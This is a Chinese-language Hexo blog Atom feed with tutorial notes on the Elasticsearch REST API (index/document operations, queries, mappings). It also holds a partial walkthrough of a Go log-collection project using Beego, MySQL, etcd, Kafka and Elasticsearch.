<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2021-11-16T08:52:42.679Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Elasticsearch笔记</title>
    <link href="elssm.github.io/2021/11/16/Elasticsearch%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2021/11/16/Elasticsearch笔记/</id>
    <published>2021-11-16T06:29:54.000Z</published>
    <updated>2021-11-16T08:52:42.679Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ElasticSearch简介"><a href="#ElasticSearch简介" class="headerlink" title="ElasticSearch简介"></a>ElasticSearch简介</h4><p>Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。Elasticsearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。</p><h4 id="ElasticSearch对比MySQL"><a href="#ElasticSearch对比MySQL" class="headerlink" title="ElasticSearch对比MySQL"></a>ElasticSearch对比MySQL</h4><div class="table-container"><table><thead><tr><th>ELasticSearch</th><th>MySQL</th></tr></thead><tbody><tr><td>index</td><td>database</td></tr><tr><td>type</td><td>table</td></tr><tr><td>document</td><td>row</td></tr><tr><td>field</td><td>column</td></tr></tbody></table></div><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>RESTful中文意思是表现层状态转化。</p><p>在RESTful架构中：每一个URI代表一种资源；客户端和服务器之间，传递这种资源的某种表现层；客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。通过URI指定资源，如<code>Index，Document</code>等。通过<code>Http Method</code>指明资源操作类型，如<code>GET POST PUT DELETE</code>等。</p><h4 id="索引创建"><a href="#索引创建" class="headerlink" title="索引创建"></a>索引创建</h4><p>使用postman工具创建一个名为<code>shopping</code>的索引，请求方式为<code>PUT</code></p><p><img src="/2021/11/16/Elasticsearch笔记/1.png" alt="1"></p><h4 id="索引查询"><a href="#索引查询" class="headerlink" title="索引查询"></a>索引查询</h4><h5 id="获取单个索引信息"><a href="#获取单个索引信息" class="headerlink" title="获取单个索引信息"></a>获取单个索引信息</h5><p><img src="/2021/11/16/Elasticsearch笔记/2.png" alt="2"></p><h5 id="获取全部索引信息"><a href="#获取全部索引信息" class="headerlink" title="获取全部索引信息"></a>获取全部索引信息</h5><p>请求地址后面添加<code>_cat/indices?v</code></p><p><img src="/2021/11/16/Elasticsearch笔记/3.png" alt="3"></p><h4 id="索引删除"><a href="#索引删除" class="headerlink" title="索引删除"></a>索引删除</h4><p>删除名为<code>shopping</code>的索引，请求方式为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/4.png" alt="4"></p><h4 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h4><p>请求方式为<code>POST</code>，请求地址为<code>http://localhost:9200/索引名/_doc</code>，请求体为<code>JSON</code>格式</p><p><img src="/2021/11/16/Elasticsearch笔记/5.png" alt="5"></p><p>由于ES自动生成的<code>id</code>不便于记忆，因此我们可以自定义id，只需要在<code>_doc</code>后写入自定义的id即可</p><p><img src="/2021/11/16/Elasticsearch笔记/6.png" alt="6"></p><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><p>只需要将创建文档的请求方式改为<code>GET</code>即可，其中<code>_doc</code>后面的<code>1001</code>相当于主键</p><p><img src="/2021/11/16/Elasticsearch笔记/7.png" alt="7"></p><p>获取索引下的所有数据，可以在请求的索引后加<code>_search</code></p><p><img src="/2021/11/16/Elasticsearch笔记/8.png" alt="8"></p><h4 id="修改索引下的数据"><a href="#修改索引下的数据" class="headerlink" title="修改索引下的数据"></a>修改索引下的数据</h4><h5 id="全量更新"><a href="#全量更新" class="headerlink" title="全量更新"></a>全量更新</h5><p>因为全量更新的请求是满足幂等条件的，因此请求方式为<code>PUT</code>，将需要修改的内容以<code>JSON</code>格式写入请求体</p><p><img src="/2021/11/16/Elasticsearch笔记/9.png" alt="9"></p><h5 id="局部更新"><a href="#局部更新" class="headerlink" title="局部更新"></a>局部更新</h5><p>局部更新的请求不满足幂等条件，因此请求方式为<code>POST</code>，而且因为是局部更新，因此索引名后面要写<code>_update</code>而不能写<code>_doc</code></p><p><img src="/2021/11/16/Elasticsearch笔记/10.png" alt="10"></p><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>资源地址和创建时是一样的，请求方式变为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/11.png" alt="11"></p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><h5 id="请求路径查询"><a href="#请求路径查询" class="headerlink" title="请求路径查询"></a>请求路径查询</h5><p>请求方式为<code>GET</code>，请求路径为<code>http://localhost:9200/shopping/_search?q=category:iphone13</code></p><p>该请求路径表示查询shopping索引下<code>category=iphone13</code>的所有结果</p><p><img src="/2021/11/16/Elasticsearch笔记/12.png" alt="12"></p><h5 id="请求体查询"><a href="#请求体查询" class="headerlink" title="请求体查询"></a>请求体查询</h5><p>请求体查询在请求路径只需要输入<code>http://localhost:9200/shopping/_search</code>，在请求体中添加<code>JSON</code>查询请求如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/13.png" alt="13"></p><p>如果要全量查询，只需要将请求体中的<code>match</code>改为<code>match_all</code>即可</p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>全量查询的话数据量会很大，因此我们可以采用分页查询</p><p>请求体中添加<code>JSON</code>如下，其中<code>from</code>表示从哪一页开始，0表示第一页。size表示页的大小，即每一页有多少条数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/14.png" alt="14"></p><h4 id="查询结果数据源控制"><a href="#查询结果数据源控制" class="headerlink" title="查询结果数据源控制"></a>查询结果数据源控制</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>_source</code>表示所要展示的数据源，这里我们设置只显示<code>title</code>字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : [<span class="string">"title"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/15.png" alt="15"></p><h4 id="查询结果排序"><a href="#查询结果排序" class="headerlink" title="查询结果排序"></a>查询结果排序</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>sort</code>表示所要要对数据进行排序，这里我们设置按照价格进行降序排序，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"_source"</span> : [<span class="string">"title"</span>],</span><br><span class="line">    <span class="attr">"sort"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">            <span class="attr">"order"</span> : <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/16.png" alt="16"></p><h4 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h4><h5 id="多条件同时成立"><a href="#多条件同时成立" class="headerlink" title="多条件同时成立"></a>多条件同时成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>must</code>表示多个条件必须同时成立</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"must"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/17.png" alt="17"></p><h5 id="多条件任意成立"><a href="#多条件任意成立" class="headerlink" title="多条件任意成立"></a>多条件任意成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>should</code>表示多个条件任意成立一个都行，这个时候我们会同时查出价格为5999和7999的结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"5999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/caoyifan/blog/source/_posts/Elasticsearch笔记/18.png" alt="18"></p><h4 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h4><p>请求体如下，其中<code>filter</code>表示过滤，<code>range</code>表示范围，我们选择<code>price</code>大于6000作为条件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"range"</span> : &#123;</span><br><span class="line">                    <span class="attr">"price"</span> : &#123;</span><br><span class="line">                        <span class="attr">"gt"</span> : <span class="number">6000</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/19.png" alt="19"></p><h4 id="完全匹配"><a href="#完全匹配" class="headerlink" title="完全匹配"></a>完全匹配</h4><p>ES在进行匹配查询的时候，会对文字进行插词之后倒排索引，因此对于<code>category=华为</code>来讲，我们在<code>match</code>匹配的时候只写一个华或是一个为，ES都会匹配出<code>category=华为</code>的结果。如果我们需要完全匹配的话，需要将<code>match</code>改为<code>match_phrase</code></p><h4 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h4><p>请求体如下，这里我们的匹配规则是<code>category=iphone13</code>，并对<code>category</code>字段进行高亮处理</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"match"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : <span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span> : &#123;</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/20.png" alt="20"></p><h4 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h4><h5 id="创建一个索引映射"><a href="#创建一个索引映射" class="headerlink" title="创建一个索引映射"></a>创建一个索引映射</h5><p>首先创建一个<code>test</code>索引</p><p><img src="/2021/11/16/Elasticsearch笔记/21.png" alt="21"></p><p>创建索引的结构信息</p><p>请求路径为<code>http://localhost:9200/test/_mapping</code>，请求方式为<code>PUT</code>，请求体如下，其中<code>properties</code>表示属性设置，<code>type=text</code>表示<code>name</code>可以分词处理，<code>index=true</code>表示<code>name</code>可以被索引查询，<code>type=keyword</code>表示<code>sex</code>不可以分词处理，必须完整匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sex"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tel"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/22.png" alt="22"></p><h5 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h5><p><img src="/2021/11/16/Elasticsearch笔记/23.png" alt="23"></p><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>因为我们的<code>name</code>设置的是可以分词，因此我们在查询的时候对于<code>name</code>只匹配一个字也可以查询出来结果。</p><p><img src="/2021/11/16/Elasticsearch笔记/24.png" alt="24"></p><p>对于<code>sex</code>因为我们设置的是<code>keyword</code>，因此不可以分词查询。必须完全匹配。</p><p><img src="/2021/11/16/Elasticsearch笔记/25.png" alt="25"></p><p><img src="/2021/11/16/Elasticsearch笔记/26.png" alt="26"></p><p>而对于<code>tel</code>字段，因为<code>index</code>为<code>false</code>，即不可以通过索引进行查询，因此我们无法根据<code>tel</code>字段查到数据。</p><p><img src="/2021/11/16/Elasticsearch笔记/27.png" alt="27"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ElasticSearch简介&quot;&gt;&lt;a href=&quot;#ElasticSearch简介&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch简介&quot;&gt;&lt;/a&gt;ElasticSearch简介&lt;/h4&gt;&lt;p&gt;Elasticsearch是一个基于
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Go日志收集项目流程梳理</title>
    <link href="elssm.github.io/2021/11/12/Go%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>elssm.github.io/2021/11/12/Go日志收集项目流程梳理/</id>
    <published>2021-11-12T07:10:44.000Z</published>
    <updated>2021-11-15T09:54:48.959Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从etcd中实时获取所要收集的日志项，然后通过sarama从相应的日志文件读取日志信息发送到Kafka。logTransfer负责从Kafka中读取日志，并将日志写入elasticsearch最后通过Kibana进行日志的检索。</p><h4 id="logBeegoWeb"><a href="#logBeegoWeb" class="headerlink" title="logBeegoWeb"></a>logBeegoWeb</h4><p>前端使用Beego框架完成。在运行项目之前，首先安装bee脚手架。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/beego/bee</span><br></pre></td></tr></table></figure><p>执行<code>bee</code>命令查看是否安装成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % bee</span><br><span class="line">Bee is a Fast and Flexible tool for managing your Beego Web Application.</span><br><span class="line"></span><br><span class="line">USAGE</span><br><span class="line">    bee command [arguments]</span><br><span class="line"></span><br><span class="line">AVAILABLE COMMANDS</span><br><span class="line"></span><br><span class="line">    version     Prints the current Bee version</span><br><span class="line">    migrate     Runs database migrations</span><br><span class="line">    api         Creates a Beego API application</span><br><span class="line">    bale        Transforms non-Go files to Go source files</span><br><span class="line">    fix         Fixes your application by making it compatible with newer versions of Beego</span><br><span class="line">    pro         Source code generator</span><br><span class="line">    dlv         Start a debugging session using Delve</span><br><span class="line">    dockerize   Generates a Dockerfile for your Beego application</span><br><span class="line">    generate    Source code generator</span><br><span class="line">    hprose      Creates an RPC application based on Hprose and Beego frameworks</span><br><span class="line">    new         Creates a Beego application</span><br><span class="line">    pack        Compresses a Beego application into a single file</span><br><span class="line">    rs          Run customized scripts</span><br><span class="line">    run         Run the application by starting a local development server</span><br><span class="line">    server      serving static content over HTTP on port</span><br><span class="line">    update      Update Bee</span><br><span class="line"></span><br><span class="line">Use bee help [command] for more information about a command.</span><br><span class="line"></span><br><span class="line">ADDITIONAL HELP TOPICS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Use bee help [topic] for more information about that topic.</span><br></pre></td></tr></table></figure><p>进入logBeegoWeb文件夹，<code>bee run</code>启动项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro logBeegoWeb % bee run</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.12.0</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0001 Using 'logBeegoWeb' as 'appname'</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0002 Initializing watcher...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0003 Built Successfully!</span><br><span class="line">2021/11/12 15:09:32 INFO     ▶ 0004 Restarting 'logBeegoWeb'...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0005 './logBeegoWeb' is running...</span><br><span class="line">2021/11/12 15:09:32.451 [I] [asm_amd64.s:1374]  http server Running on http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>查看本地<code>8080</code>端口，项目启动成功</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/1.png" alt="1"></p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>创建数据库的sql源码如下，创建名为<code>logCollect</code> 的数据库，并创建三张表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> logCollect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_info(</span><br><span class="line">app_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_name <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">app_type <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">develop_path <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_ip(</span><br><span class="line">app_id <span class="built_in">int</span>,</span><br><span class="line">ip <span class="built_in">varchar</span>(<span class="number">64</span>),</span><br><span class="line"><span class="keyword">Key</span> app_id_ip_index (app_id, ip)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_log_info(</span><br><span class="line">log_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_id <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">log_path <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">topic <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line"><span class="keyword">status</span> <span class="built_in">tinyint</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>数据库创建成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_logcollect |</span><br><span class="line">+----------------------+</span><br><span class="line">| tbl_app_info         |</span><br><span class="line">| tbl_app_ip           |</span><br><span class="line">| tbl_log_info         |</span><br><span class="line">+----------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>在前端主页面，项目列表对应<code>tbl_app_info</code>这张表，日志列表对应<code>tbl_log_info</code>这张表。<code>tbl_app_ip</code>这张表用来保存项目所在的<code>ip</code>地址。</p><h4 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h4><p>当我们申请好项目之后，就可以针对该项目所产生的日志进行收集。对于所要收集的日志配置信息，可以采用etcd进行存储。</p><p>例如我们可以在日志申请页写入所要收集的项目信息，前提是项目的名字必须在项目列表中是存在的，否则日志申请就会失败。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/2.png" alt="2"></p><p>etcd中获取key的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 